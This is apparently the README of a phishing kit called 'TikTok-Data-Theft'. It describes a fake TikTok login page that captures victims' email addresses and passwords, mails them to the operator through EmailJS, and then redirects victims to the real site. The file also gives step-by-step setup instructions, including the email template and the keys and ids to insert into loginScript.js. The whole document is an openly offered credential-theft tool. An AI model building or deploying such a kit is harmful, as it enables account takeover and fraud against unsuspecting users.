# TikTok-Data-Theft
## How does the site work?
First, the user or gerta goes to our TikTok account login page. Of all the login options, only the mail login works. The user enters their mail and password. At this time his data is sent to our e-mail and the user is redirected to the real TikTok login page. You can't go back to the scam page.
## What do you need?
To use the site you need to register on the <b>EmailJS</b> site. There we have to register our mail service (not an account, but a mail), where we will receive messages. Then we must create our own email template. The content of the email should look like this:
```
Email: {{email}}
Password: {{password}}
```

After that in `loginScript.js` file we replace the fields `your_public_key` with your public key, `your_service_id` with your service id, this is exactly where we registered the mail and `your_template_id` with the id of the template email.
